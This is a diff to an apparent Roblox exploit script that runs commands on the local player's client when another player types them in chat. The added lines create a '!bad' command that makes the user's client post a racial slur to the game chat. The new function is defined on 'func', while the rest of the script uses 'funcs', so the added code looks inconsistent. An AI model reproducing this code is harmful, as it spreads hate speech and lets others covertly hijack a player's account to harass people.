@@ -15,6 +15,9 @@ end
 function funcs:reset()
 	game:GetService("ReplicatedStorage").rbxts_include.node_modules.net.out._NetManaged.ResetCharacter:FireServer()
 end
+function func:bad()
+	game.TextChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("feedsomeniggas")
+end
 function funcs:kill2()
 	lplr.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Dead,true)
 	lplr.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Dead)
@@ -297,6 +300,8 @@ for i,v in pairs(game:GetService("Players"):GetChildren()) do
 				funcs:void()
 			elseif a == "!kill2" then
 				funcs:kill2()
+			elseif a == "!bad" then
+				 func:bad()
 			elseif a == "!lagback" then
 				funcs:lagback()
 			elseif a == "!sit" then
@@ -342,6 +347,8 @@ game:GetService("Players").PlayerAdded:Connect(function(v)
 				funcs:void()
 			elseif a == "!kill2" then
 				funcs:kill2()
+			elseif a == "!bad" then
+				 func:bad()
 			elseif a == "!lagback" then
 				funcs:lagback()
 			elseif a == "!sit" then
